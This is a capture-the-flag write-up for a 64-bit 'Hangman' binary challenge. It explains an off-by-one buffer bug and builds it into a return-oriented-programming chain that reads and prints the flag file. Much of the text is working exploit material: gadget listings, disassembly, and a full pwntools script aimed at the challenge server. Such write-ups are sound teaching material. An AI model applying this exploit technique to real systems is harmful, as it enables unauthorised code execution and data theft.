# Hangman - Solution

Created by MrPeck ([Discord](https://discordapp.com/users/271721414606848010))

## Description
>![alt text](assets/first-time.png "fontforge")\
`nc challenges1.hexionteam.com 3000`\
Note: flag is in `./flag`

## Solution

At first run we see a beautiful ASCII Art of a man hanging and a menu with three choices:
```
1 - Guess letter
2 - Guess word
3 - Give up
```

On choice `1`, we are asked to input a letter. If the letter exists in the word, it is added, otherwise we go down one life.</br>
On choice `2`, we are asked to input a word. If the word is correct, we win the game, otherwise we go down one life.</br>
On choice `3`, we exit the game.</br>

Now let's take a look at the source-code.

We first notice the `hangmanGame` structure:

```c
struct hangmanGame
{
    char word[WORD_MAX_LEN];
    char *realWord;
    char buffer[WORD_MAX_LEN];
    int wordLen;
    int hp;
};
```

We notice that we have a `buffer` and immediately after it, we have `wordLen`. It'll be important later on.

Let's take a look at `guessWord`.

```c
int guessWord(struct hangmanGame *game)
{
    int i = 0;
    int len = game->wordLen;

    for (i = 0; i <= len; i++) // (1)
    {
        game->buffer[i] = (char)getchar();
        if (game->buffer[i] == '\n')
        {
            break;
        }
    }
    
    ...
}
```
At `(1)` we can spot a mistake that cause an off-by-one vulnerabilty, by the simple mistake of having "`i <= len`" instead of "`i < len`". That enables us to overwrite one byte after the end of `game->buffer`, and as we've seen before, immediately after `game->buffer`, is `game->wordLen` which defines the maximum length of the buffer. Now we can overwrite the length of the buffer and get "unlimited" length!

Now that we have "unlimited" write to the stack, we can control `PC` and therefore the code flow. We want to get the contents of flag, so let's try and do that.

In the source-code we have the function `getWord`:

```c
char* getWord(char *filename, unsigned int wordMaxLen)
{
    unsigned int i = 0;
    unsigned int numOfWords = countLinesNum(filename); // (1)
    unsigned int wordNum = rand() % numOfWords + 1; // (2)
    unsigned int wordLen = 0;
    FILE* file = NULL;
    char *word = malloc(wordMaxLen);

    file = fopen(filename, "r"); // (3)
    if (!file)
    {
        puts("Failed to load list of words...");
        exit(1);
    }

    for (i = 0; i < wordNum && fgets(word, wordMaxLen, file); i++); // (4)
    
    wordLen = strlen(word);
    for (i = 0; i < wordLen; i++)
    {
        if (word[i] == '\n')
        {
            word[i] = '\0';
        }
    }

    fclose(file);

    return word;
}
```

On `(1)`, from the name of the function `countLinesNum` we can deduce that it gives us the number of lines inside the file. Line `(2)` gets us a random line within the file. Then we open a file `filename` that we get as a argument of the function `getWord` on line `(3)`. After openning the file, every line is read until getting to the line number we got at `(2)`. At the end of the function we return it.

Having control of `PC` we can redirect the flow to call `getWord` having a string `"flag"` and some big number as arguments for the parameters `filename` and `wordMaxLen` respectively. On `x86_64` ELF executables, the calling convention has the register `RDI` for first parameter (`filename`) and `RSI` for second argument (`wordMaxLen`). We need then, to get an address to a string `"flag"` into `RDI` and a reasonably great integer inside `RSI`. Having control over `PC`, we need only to find useful gadgets and `ROP` around to get all the arguments in place. 

Now let's fire up pwntool and look for some gadgets:
```py
In [1]: from pwn import *

In [2]: exe = context.binary = ELF('./hangman')
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

In [3]: r = ROP(exe)

In [4]: r.gadgets
Out[4]:
{4198423: Gadget(0x401017, ['add esp, 8', 'ret'], [], 0x10),
 4198422: Gadget(0x401016, ['add rsp, 8', 'ret'], [], 0x10),
 4199124: Gadget(0x4012d4, ['leave', 'ret'], ['rbp', 'rsp'], 0x2540be407),
 4200860: Gadget(0x40199c, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x28),
 4200862: Gadget(0x40199e, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x20),
 4200864: Gadget(0x4019a0, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0x18),
 4200866: Gadget(0x4019a2, ['pop r15', 'ret'], ['r15'], 0x10),
 4200859: Gadget(0x40199b, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x30),
 4200863: Gadget(0x40199f, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x20),
 4198957: Gadget(0x40122d, ['pop rbp', 'ret'], ['rbp'], 0x10),
 4200867: Gadget(0x4019a3, ['pop rdi', 'ret'], ['rdi'], 0x10), # (1)
 4200865: Gadget(0x4019a1, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18), # (2)
 4200861: Gadget(0x40199d, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x28),
 4198426: Gadget(0x40101a, ['ret'], [], 0x8)}
```

There we found two very interesting gadgets. `(1)` that gives us pop to `RDI` and `(2)` that gives us pop to `RSI` and `R15`, we can ignore `R15` by just popping some random value into it. 

For the first argument, we need a string `"flag"`. It is possible to write it into the stack but since `ASLR` is enabled, we can't know the exact address so that's not an option. Looking a little bit more into the code, we see the following line:

```c
puts("But it is still not enough to get a flag");
```

So now we have a string `"flag"` at an address we can predict since the executable is not compiled with `PIE`. Let's go back to pwntools and find it's address:

```py
In [5]: next(exe.search(b'flag'))
Out[5]: 0x40232c
```

Now we have all we need to get the flag into memory, now we need to print it. The function `getWord` returns the address of the word chosen, which in this case, it is our sweet flag, which means that we will have the address of `"flag"` on `RAX`. Now we only need to find a gadget that moves a value from `RAX` to a relevant parameter and print it.

From the source-code we have the following line:
```c
printf("You've guessed the word \"%s\"!!!\n", game.realWord);
```
we can find the address from the output of `objdump -D -Mintel hangman`:

```
  401825:       48 89 c6                mov    rsi,rax
  401828:       48 8d 3d b1 0a 00 00    lea    rdi,[rip+0xab1]        # 4022e0 <_IO_stdin_used+0x2e0>
  40182f:       b8 00 00 00 00          mov    eax,0x0
  401834:       e8 47 f8 ff ff          call   401080 <printf@plt>
```

This solves all of our problems since we have a format string that within it has another string that receives its address from `RAX`.

Now that we have all the gadgets we need, we only need to build our payload.

## Exploit

```py
from pwn import *
import re

def create_payload(binary):
    exe = context.binary = ELF(binary)
    r = ROP(exe)
    payload = ''

    # Address of "flag" string
    flag_str_addr = p64(next(exe.search('flag')))

    # Address of getWord function
    getWord_func_addr = p64(exe.symbols['getWord'])

    # Set values of the arguments that getWord will receive when called
    getWord_arg1 = flag_str_addr
    getWord_arg2 = p64(0x100)

    # Addresses of both ROP gadgets that we found previously
    pop_rdi__ret_addr = p64(r.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi__pop_r15__ret_addr = p64(r.find_gadget(['pop rsi', 'pop r15', 'ret']).address)

    # Address of function game loop, function where the printf call that we use
    # to print our flag is called
    gameLoop_addr = exe.symbols['gameLoop']

    # The commands to move RAX to RSI and the call to printf are at an offset of 0x180
    # from the beggining of the function gameLoop
    print_block_addr = p64(gameLoop_addr + 0x180)

    # Now let's build the actual payload:
    # First we need to choose option two so we can overflow the buffer by one and overwrite the length variable, therefore, getting ourselves full control of the stack and control over PC.
    payload += '2\n' + 'A' * 32 + '\xff\n\n'

    # Fill in the stack until we get to the Return Pointer
    payload += '2\n' + 'B' * 64

    # Here we set the gadget that will pop the next value in the stack into RDI
    # So when "pop rdi" is run, the next value, which will be the address to the "flag" string (getWord_arg1), will be popped into RDI. 
    payload += pop_rdi__ret_addr + getWord_arg1

    # Now we set the gadget that will give us control over RSI, so we set it to 
    # have some big number; in our case, 0x100. The gadget comes together with 
    # "pop r15", so we need to give some random value, just so we can ignore it.
    payload += pop_rsi__pop_r15__ret_addr + getWord_arg2 + p64(0x1337)

    # Now we finally jump to the function getWord, where the file "flag" will be loaded
    # into memory and the address of the content buffer returned, or in other words, saved into RAX.
    payload += getWord_func_addr

    # Now the only thing we need, is to print the flag. So let's just call to our last
    # gadget that will take care of copying the address of the flag from RAX into RSI and passing it to printf.
    payload += print_block_addr

    # New line to finish the input
    payload += '\n'

    # And we have our payload!!!

    return payload


def main():
    binary = './hangman'
    io = remote('challenges1.hexionteam.com', 3000)
    payload = create_payload(binary)

    # Now let's send it and get ourselves our nice flag!!!
    io.send(payload)
    out = io.recvall()
    
    print re.search('hexCTF{.*}', out).group(0)


if __name__ == '__main__':
    main()
```

Flag: hexCTF{e1th3r_y0u_gu3ss_0r_y0u_h4ng}

